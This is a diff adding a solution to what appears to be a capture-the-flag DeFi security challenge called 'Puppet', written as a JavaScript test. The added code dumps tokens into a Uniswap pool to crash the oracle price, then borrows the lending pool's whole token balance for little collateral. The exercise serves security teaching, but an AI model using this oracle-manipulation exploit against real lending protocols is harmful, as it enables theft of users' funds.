@@ -103,6 +103,34 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        let poolTokenBal = await this.token.balanceOf(this.lendingPool.address)
+        console.log('poolTokenBal', poolTokenBal.toString());
+        let attackerTokenBal = await this.token.balanceOf(attacker.address)
+        console.log('attackerTokenBal', attackerTokenBal.toString());
+        let attackerEthBal = await await ethers.provider.getBalance(attacker.address);
+        console.log('attackerEthBal', attackerEthBal.toString());
+
+        console.log('approve');
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther('1000000000000'));
+        
+        console.log('sell token for eth');
+        let txn = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(attackerTokenBal.sub(1), 1, (await ethers.provider.getBlock('latest')).timestamp * 2);
+        await txn.wait();
+
+        poolTokenBal = await this.token.balanceOf(this.lendingPool.address)
+        console.log('poolTokenBal', poolTokenBal.toString());
+        attackerTokenBal = await this.token.balanceOf(attacker.address)
+        console.log('attackerTokenBal', attackerTokenBal.toString());
+        attackerEthBal = await await ethers.provider.getBalance(attacker.address);
+        console.log('attackerEthBal', attackerEthBal.toString());
+
+        const requiredAmt = await this.lendingPool.calculateDepositRequired(poolTokenBal)
+        console.log('requiredAmt', requiredAmt.toString());
+
+        console.log('borrow');
+        await this.lendingPool.connect(attacker).borrow(poolTokenBal, {value: requiredAmt});
+        
     });
 
     after(async function () {
